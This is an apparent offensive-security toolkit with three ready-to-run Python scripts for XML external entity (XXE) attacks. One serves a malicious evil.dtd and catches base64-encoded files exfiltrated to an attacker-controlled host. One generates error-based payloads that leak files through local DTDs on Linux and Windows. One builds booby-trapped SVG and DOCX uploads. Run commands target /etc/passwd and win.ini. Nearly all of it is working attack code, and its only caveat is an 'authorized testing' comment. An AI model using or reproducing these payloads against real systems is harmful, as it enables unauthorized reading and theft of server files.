entries.title: Blind XXE OOB exfil server (evil.dtd + base64 catcher)
entries.body:
Spins up a local HTTP server that serves a malicious `evil.dtd` and catches the base64 exfiltration of a file from the target. This is the combo for out-of-band XXE: an external parameter entity reads the file via `php://filter` (base64), then wraps the contents into a callback URL to you. Use it when the XML parser does not print the result in the response (blind XXE) and there is no error-based vector. The script prints the payload to send into the vulnerable point and decodes the caught data back into a file.

> Important: `php://filter/convert.base64-encode` works ONLY when the XML is parsed by PHP (libxml). For Java/.NET parsers this wrapper is unavailable; there, read the file directly (`file:///etc/passwd`) and exfiltrate over another OOB channel.

```python
#!/usr/bin/env python3
# xxe_oob_exfil.py - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.
# Host evil.dtd and catch base64-exfil for blind (out-of-band) XXE.
import argparse, base64, urllib.parse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

CFG = {}  # filled in main(): lhost, lport, file, out

EVIL_DTD = (
    '<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource={file}">\n'
    '<!ENTITY % eval "<!ENTITY % exfil SYSTEM '
    "'http://{lhost}:{lport}/leak?d=%file;'>\">\n"
    '%eval;\n%exfil;\n'
)

PAYLOAD = (
    '<?xml version="1.0"?>\n'
    '<!DOCTYPE r [\n'
    '  <!ENTITY % sp SYSTEM "http://{lhost}:{lport}/evil.dtd">\n'
    '  %sp;\n'
    ']>\n<r>x</r>\n'
)

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path.startswith("/evil.dtd"):
            dtd = EVIL_DTD.format(file=CFG["file"], lhost=CFG["lhost"], lport=CFG["lport"]).encode()
            self.send_response(200); self.send_header("Content-Type", "application/xml")
            self.send_header("Content-Length", str(len(dtd))); self.end_headers()
            self.wfile.write(dtd)
            print(f"[*] served evil.dtd to {self.client_address[0]}")
        elif self.path.startswith("/leak"):
            data = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query).get("d", [""])[0]
            print(f"[+] exfil received ({len(data)} b64 chars) from {self.client_address[0]}")
            try:
                raw = base64.b64decode(data + "=" * (-len(data) % 4))
                with open(CFG["out"], "wb") as f:
                    f.write(raw)
                print(f"[=] decoded -> {CFG['out']}\n--- preview ---")
                print(raw[:400].decode("utf-8", "replace"))
            except Exception as e:
                print(f"[!] decode failed ({e})")
            self.send_response(200); self.end_headers(); self.wfile.write(b"ok")
        else:
            self.send_response(404); self.end_headers()
    def log_message(self, *a): pass

def main():
    ap = argparse.ArgumentParser(description="ARS3NAL blind XXE OOB exfil server")
    ap.add_argument("--lhost", required=True, help="your reachable IP")
    ap.add_argument("--lport", type=int, default=8000)
    ap.add_argument("--file", default="/etc/passwd", help="remote file to read (php://filter target)")
    ap.add_argument("--out", default="loot.bin", help="where to save decoded data")
    ap.add_argument("--bind", default="0.0.0.0")
    a = ap.parse_args()
    CFG.update(lhost=a.lhost, lport=a.lport, file=a.file, out=a.out)
    print("[*] send THIS payload to the vulnerable XML sink:\n")
    print(PAYLOAD.format(lhost=a.lhost, lport=a.lport))
    print(f"[*] listening on {a.bind}:{a.lport} ...")
    ThreadingHTTPServer((a.bind, a.lport), H).serve_forever()

if __name__ == "__main__":
    main()
```

Run:
```bash
python3 xxe_oob_exfil.py --lhost 10.10.14.7 --lport 8000 --file /etc/passwd
# copy the printed XML payload into the vulnerable field/request body and wait for a hit
```

entries.title: Error-based XXE (local DTD overwrite, Linux/Windows)
entries.body:
Error-based XXE: pulls the contents of a local file into the parser's error message text, without any outbound OOB channel. The trick relies on a LOCAL DTD already present on the system, redefining one parameter entity inside it to provoke an error into which the read file lands. Use it when outbound egress is closed (you cannot reach your own server) but the application returns the XML parser's error text. The script prints a ready payload for Linux (fontconfig DTD) and for Windows (cim20.dtd).

> You need a DTD file that actually exists on the target. Linux: `/usr/share/xml/fontconfig/fonts.dtd` (often present when fontconfig is installed). Windows: `C:\\Windows\\System32\\wbem\\xml\\cim20.dtd`. If they are missing - find another local .dtd via LFI/enumeration.

```python
#!/usr/bin/env python3
# xxe_error_based.py - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.
# Emit error-based XXE payloads that leak a file via a LOCAL DTD overwrite.
import argparse

# We redefine an existing parameter entity from a known local DTD so the parser
# emits our file content inside an error message (no outbound channel needed).
TEMPLATE = r"""<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY % local_dtd SYSTEM "file://{dtd}">
  <!ENTITY % {ent} '
    <!ENTITY % file SYSTEM "{wrapper}{file}">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM 'file:///nonexistent/%file;'>">
    %eval;
    %error;
  '>
  %local_dtd;
]>
<r>x</r>
"""

PRESETS = {
    "linux":   {"dtd": "/usr/share/xml/fontconfig/fonts.dtd", "ent": "constant"},
    "windows": {"dtd": "C:\\\\Windows\\\\System32\\\\wbem\\\\xml\\\\cim20.dtd", "ent": "SuperClass"},
}

def main():
    ap = argparse.ArgumentParser(description="ARS3NAL error-based XXE payload generator")
    ap.add_argument("--os", choices=PRESETS, default="linux")
    ap.add_argument("--file", default="/etc/passwd", help="file to leak (use C:\\... on windows)")
    ap.add_argument("--php-filter", action="store_true",
                    help="wrap target in php://filter base64 (PHP/libxml only)")
    ap.add_argument("--dtd", help="override the local DTD path")
    ap.add_argument("--ent", help="override the parameter-entity name to overwrite")
    a = ap.parse_args()
    p = PRESETS[a.os]
    dtd = a.dtd or p["dtd"]
    ent = a.ent or p["ent"]
    wrapper = "php://filter/convert.base64-encode/resource=" if a.php_filter else "file://"
    print(TEMPLATE.format(dtd=dtd, ent=ent, wrapper=wrapper, file=a.file))

if __name__ == "__main__":
    main()
```

Run:
```bash
# Linux (fontconfig DTD), read /etc/passwd:
python3 xxe_error_based.py --os linux --file /etc/passwd
# Windows (cim20.dtd):
python3 xxe_error_based.py --os windows --file "C:\\Windows\\win.ini"
# the override-entity name depends on the DTD version; --ent lets you adjust it
```

entries.title: XXE upload kit (malicious SVG + patched DOCX)
entries.body:
A file generator for XXE-via-upload: many applications parse XML inside uploadable formats (SVG, DOCX/XLSX/PPTX, which are ZIP inside). The script builds a malicious SVG (XXE in `<image>`/text) and patches a DOCX, injecting an external entity into `word/document.xml`. Use it when there is no direct XML endpoint but there is an upload of avatars/documents/image processing (for example, server-side SVG -> PNG rendering or text extraction from a DOCX). It substitutes your OOB host into the payload.

> The SVG vector is usually blind (read on the server during rendering) - pair it with `xxe_oob_exfil.py`. A DOCX is just a ZIP: the entity is inserted into `word/document.xml`, the rest of the archive's parts stay valid, otherwise the office parser rejects the file.

```python
#!/usr/bin/env python3
# xxe_upload_kit.py - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.
# Build XXE-laced upload payloads: malicious SVG and a patched DOCX.
import argparse, io, zipfile, os

def make_svg(lhost, lport, file):
    return f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY % sp SYSTEM "http://{lhost}:{lport}/evil.dtd">
  %sp;
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="60">
  <text x="0" y="40">&exfil;</text>
</svg>
"""

def make_docx(src, lhost, lport, out):
    # inject an external entity into word/document.xml, keep the rest of the zip intact
    entity = (f'<!DOCTYPE root [<!ENTITY xxe SYSTEM '
              f'"http://{lhost}:{lport}/evil.dtd">]>')
    with zipfile.ZipFile(src, "r") as zin:
        names = zin.namelist()
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zout:
            for n in names:
                data = zin.read(n)
                if n == "word/document.xml":
                    txt = data.decode("utf-8", "replace")
                    # place the DOCTYPE right after the XML declaration
                    if "?>" in txt:
                        head, rest = txt.split("?>", 1)
                        txt = head + "?>" + entity + rest
                    else:
                        txt = entity + txt
                    data = txt.encode("utf-8")
                zout.writestr(n, data)
    with open(out, "wb") as f:
        f.write(buf.getvalue())

def main():
    ap = argparse.ArgumentParser(description="ARS3NAL XXE upload kit (SVG/DOCX)")
    ap.add_argument("--lhost", required=True)
    ap.add_argument("--lport", type=int, default=8000)
    ap.add_argument("--file", default="/etc/passwd", help="for the evil.dtd target (info)")
    ap.add_argument("--svg", default="xxe.svg", help="output SVG path")
    ap.add_argument("--docx-src", help="clean .docx to patch")
    ap.add_argument("--docx-out", default="xxe.docx")
    a = ap.parse_args()
    with open(a.svg, "w", encoding="utf-8") as f:
        f.write(make_svg(a.lhost, a.lport, a.file))
    print(f"[+] wrote {a.svg}  (pair with xxe_oob_exfil.py serving evil.dtd)")
    if a.docx_src and os.path.exists(a.docx_src):
        make_docx(a.docx_src, a.lhost, a.lport, a.docx_out)
        print(f"[+] wrote {a.docx_out} (patched word/document.xml)")
    else:
        print("[*] no --docx-src given; skipped DOCX")

if __name__ == "__main__":
    main()
```

Run:
```bash
# needs xxe_oob_exfil.py running (serves evil.dtd and catches exfil)
python3 xxe_upload_kit.py --lhost 10.10.14.7 --lport 8000 --svg avatar.svg
# patch a real docx:
python3 xxe_upload_kit.py --lhost 10.10.14.7 --docx-src clean.docx --docx-out evil.docx
```
